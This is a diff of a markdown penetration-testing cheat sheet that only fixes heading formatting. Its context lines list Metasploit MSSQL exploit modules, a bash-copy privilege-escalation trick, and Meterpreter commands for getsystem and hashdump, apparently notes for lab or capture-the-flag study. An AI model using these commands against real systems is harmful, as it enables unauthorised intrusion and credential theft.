@@ -420,7 +420,7 @@ cp /bin/bash greetings
 ./welcome
 ```
 
-MSSQL: 1433
+# MSSQL: 1433
 
 ```bash
 ## nmap
@@ -444,17 +444,17 @@ exploit/windows/mssql/mssql_payload
 exploit/windows/mssql/mssql_payload_sqli
 ```
 
-#Meterpreter 
+# Meterpreter 
 getprivsps
 
-####Windows
+#### Windows
 cd C:\\
 ls
 
-####Privilage Escalation 
+#### Privilage Escalation 
 getsystem
 
-####Hashdump
+#### Hashdump
 hashdump
 
 #### Search 
